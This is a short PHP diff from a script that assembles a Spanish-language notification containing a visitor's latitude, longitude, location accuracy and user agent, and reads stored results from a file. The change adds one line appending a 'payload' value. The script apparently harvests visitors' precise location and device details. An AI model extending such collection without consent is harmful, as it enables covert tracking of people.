@@ -32,6 +32,8 @@ if (!empty($lon)) $msg .= "📌 Lon: $lon\n";
 if (!empty($acc)) $msg .= "🎯 Precisión: {$acc}m\n";
 if (!empty($ua)) $msg .= "🖥️ UA: $ua\n";
 
+$msg .= "📍 <b>Datos: ".$payload."</b>\n";
+
 // --- Leer datos guardados del archivo resultados.txt ---
 $file = __DIR__ . "/resultados.txt";
 if (file_exists($file)) {
